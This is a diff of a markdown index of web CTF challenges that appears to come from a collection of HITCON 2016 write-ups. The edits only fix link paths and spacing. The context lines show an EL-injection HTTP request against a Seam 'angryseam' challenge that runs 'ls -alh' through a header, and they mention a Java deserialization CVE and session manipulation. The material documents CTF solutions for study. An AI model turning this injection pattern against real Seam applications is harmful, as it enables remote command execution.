@@ -162,12 +162,12 @@ Tag: **GrayBox**, **Java**
 
 #### Source Code
 
-* [here](hitcon-ctf-2016/angry boy)
+* [here](hitcon-ctf-2016/angry%20boy)
 
 #### Solution
 
-* [exploit.py](hitcon-ctf-2016/angry boy/exploit.py)
-* [decrpt.py](hitcon-ctf-2016/angry boy/decrypt.py)
+* [exploit.py](hitcon-ctf-2016/angry%20boy/exploit.py)
+* [decrpt.py](hitcon-ctf-2016/angry%20boy/decrypt.py)
 
 #### Write Ups
 
@@ -215,6 +215,7 @@ Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, *
     ```
 
 <br>
+
 **Unintended solution**  
 
 * Register an account  
@@ -224,6 +225,7 @@ Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, *
    ```
 
 * Login and access   
+
    ```
 GET /angryseam/template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) HTTP/1.1
 host: 1.2.3.4
@@ -233,11 +235,13 @@ ccc: ls -alh
    ```
 
 <br>
+
 **Unintended solution**  
 
 * CVE-2013-2165 Java deserialization vulnerability
 
 <br>
+
 **Unintended solution**  
 
 * SESSION manipulation... seam SUCKS  
